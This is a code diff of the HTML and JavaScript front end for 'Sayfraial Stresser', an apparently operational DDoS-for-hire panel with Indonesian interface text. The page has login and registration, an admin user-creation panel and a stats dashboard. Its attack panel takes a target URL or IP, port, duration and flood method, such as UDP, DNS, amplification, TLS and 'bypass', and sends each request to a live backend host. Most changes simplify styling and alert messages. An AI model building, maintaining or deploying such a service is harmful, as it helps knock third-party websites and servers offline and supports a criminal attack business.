@@ -2,80 +2,50 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Sayfraial Stresser</title>
   <style>
-    * {
-      box-sizing: border-box;
-    }
     body {
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #0d0d0d;
-      color: #fff;
+      background: #121212;
+      color: white;
+      font-family: sans-serif;
       display: flex;
-      align-items: center;
       justify-content: center;
-      min-height: 100vh;
+      padding: 30px;
     }
-    .container {
-      width: 100%;
-      max-width: 420px;
-      padding: 20px;
-    }
+    .container { max-width: 400px; width: 100%; }
     .card {
-      background: #1a1a1a;
-      border-radius: 12px;
-      padding: 24px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
-      margin-bottom: 24px;
-    }
-    h1, h2 {
-      text-align: center;
-      margin-bottom: 16px;
+      background: #1f1f1f;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 20px;
     }
     input, select, button {
       width: 100%;
-      padding: 12px;
+      padding: 10px;
       margin-top: 10px;
-      background-color: #2a2a2a;
-      border: 1px solid #444;
-      border-radius: 8px;
-      color: #fff;
-      font-size: 14px;
-    }
-    input:focus, select:focus {
-      outline: none;
-      border-color: #00cc99;
+      border: none;
+      border-radius: 6px;
     }
     button {
-      background-color: #00cc66;
-      color: #fff;
+      background: #00cc66;
+      color: white;
       font-weight: bold;
       cursor: pointer;
-      border: none;
-      transition: 0.2s;
-    }
-    button:hover {
-      background-color: #00b359;
     }
     .link-small {
-      font-size: 13px;
-      color: #00aaff;
-      cursor: pointer;
-      margin-top: 8px;
+      font-size: 12px;
+      color: #00ccff;
       text-align: right;
+      cursor: pointer;
+      margin-top: 10px;
     }
-    .hidden {
-      display: none;
-    }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Sayfraial Stresser</h1>
 
-    <!-- Login -->
     <div id="login" class="card">
       <h2>Login</h2>
       <input type="text" id="user" placeholder="Username" />
@@ -84,7 +54,6 @@
       <p class="link-small" onclick="showRegister()">Sign up</p>
     </div>
 
-    <!-- Register -->
     <div id="register" class="card hidden">
       <h2>Register</h2>
       <input type="text" id="regUser" placeholder="Username" />
@@ -94,7 +63,6 @@
       <p class="link-small" onclick="showLogin()">Back to login</p>
     </div>
 
-    <!-- Attack -->
     <div id="attack" class="card hidden">
       <h2>Attack Panel</h2>
       <input type="text" id="target" placeholder="Target URL/IP" />
@@ -109,7 +77,6 @@
       <button onclick="sendAttack()">🚀 Attack</button>
     </div>
 
-    <!-- Dashboard -->
     <div id="dashboard" class="card hidden">
       <h2>📊 Dashboard</h2>
       <p id="stat-now">Attack Aktif: </p>
@@ -117,7 +84,6 @@
       <p id="stat-month">Bulan Ini: </p>
     </div>
 
-    <!-- Admin Panel -->
     <div id="admin" class="card hidden">
       <h2>Admin Panel</h2>
       <input type="text" id="newUser" placeholder="Username Baru" />
@@ -127,7 +93,7 @@
   </div>
 
   <script>
-    const BASE = 'https://hospitable-bravery-production.up.railway.app';
+    const BASE = "https://hospitable-bravery-production.up.railway.app";
     let isAdmin = false;
 
     function login() {
@@ -141,7 +107,7 @@
       })
       .then(res => res.json())
       .then(data => {
-        if (!data.allowed) return alert('Belum di-approve oleh admin');
+        if (!data.success) return alert('Login gagal');
         document.getElementById('login').classList.add('hidden');
         document.getElementById('attack').classList.remove('hidden');
         document.getElementById('dashboard').classList.remove('hidden');
@@ -151,7 +117,7 @@
         }
         loadStats();
       })
-      .catch(() => alert('Login gagal'));
+      .catch(() => alert('Login error'));
     }
 
     function register() {
@@ -166,7 +132,7 @@
         body: JSON.stringify({ user, pass })
       })
       .then(res => res.json())
-      .then(() => alert('Berhasil daftar, tunggu approval admin'))
+      .then(() => alert('Daftar berhasil, tunggu approval admin'))
       .catch(() => alert('Gagal daftar'));
     }
 
@@ -184,12 +150,10 @@
       const layer = document.getElementById('layer').value;
       const method = document.getElementById('method');
       method.innerHTML = '';
-
       const methods = {
         layer4: ["udp", "dns", "tcp", "fivem", "minecraft", "ovh-amp", "vse"],
         layer7: ["kalimasada", "tls", "trump", "tlsx", "bypass", "h2-blast", "https"]
       };
-
       if (methods[layer]) {
         methods[layer].forEach(m => {
           const opt = document.createElement('option');
@@ -212,13 +176,12 @@
         body: JSON.stringify({ target, port, time, method })
       })
       .then(res => res.json())
-      .then(data => alert('Attack sent: ' + JSON.stringify(data)))
-      .catch(e => alert('Error: ' + e.message));
+      .then(data => alert('Attack sent'))
+      .catch(e => alert('Gagal'));
     }
 
     function createUser() {
       if (!isAdmin) return alert('Bukan admin');
-
       const newUser = document.getElementById('newUser').value;
       const newPass = document.getElementById('newPass').value;
 
@@ -233,7 +196,7 @@
       })
       .then(res => res.json())
       .then(() => alert('User created'))
-      .catch(() => alert('Gagal create user'));
+      .catch(() => alert('Error'));
     }
 
     function loadStats() {
@@ -248,4 +211,3 @@
   </script>
 </body>
 </html>
-
